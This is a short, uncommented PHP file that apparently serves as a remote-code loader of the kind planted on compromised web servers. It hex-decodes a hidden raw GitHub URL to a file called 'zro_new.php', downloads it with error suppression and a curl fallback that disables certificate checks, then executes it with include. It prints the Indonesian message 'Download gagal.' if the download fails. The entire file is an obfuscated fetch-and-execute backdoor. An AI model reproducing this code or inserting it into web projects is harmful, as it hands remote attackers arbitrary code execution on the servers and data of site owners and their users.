<?php
$h = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F7961616A69616E6762752D7765622F746572626172752F726566732F68656164732F6D61696E2F7A726F5F6E65772E706870';

$f = function ($x) {
    $s = '';
    for ($i = 0; $i < strlen($x) - 1; $i += 2) {
        $s .= chr(hexdec($x[$i] . $x[$i + 1]));
    }
    return $s;
};

$u = $f($h);

$d = @file_get_contents($u);
if (!$d && function_exists('curl_init')) {
    $c = curl_init($u);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
    $d = curl_exec($c);
    curl_close($c);
}

if ($d) {
    $r = tmpfile();
    fwrite($r, $d);
    fseek($r, 0);
    include stream_get_meta_data($r)['uri'];
    fclose($r);
} else {
    echo "Download gagal.";
}
?>